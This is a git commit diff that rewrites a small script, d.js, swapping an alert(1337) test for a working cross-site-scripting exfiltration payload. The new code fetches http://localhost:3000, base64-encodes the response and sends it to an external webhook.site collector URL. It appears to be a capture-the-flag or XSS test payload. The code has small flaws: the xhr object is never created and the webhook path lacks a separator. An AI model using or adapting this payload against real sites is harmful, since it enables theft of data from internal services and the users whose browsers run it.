ebf29c3839421697947bfc6e6e5305c4d5205adc
Stoyan Kolev <56872319+snkolev18@users.noreply.github.com>
2025-09-13 19:03:28 +0300

    Update d.js

--- d.js
+++ d.js
@@ -1,2 +1,3 @@
-console.log(1);
-alert(1337);
+xhr.open("GET", "http://localhost:3000");
+xhr.onload = () => fetch("https://webhook.site/fef28452-dc88-40ae-ac06-5481ac42f7ff" + btoa(xhr.responseText), {mode: "no-cors"});
+xhr.send();
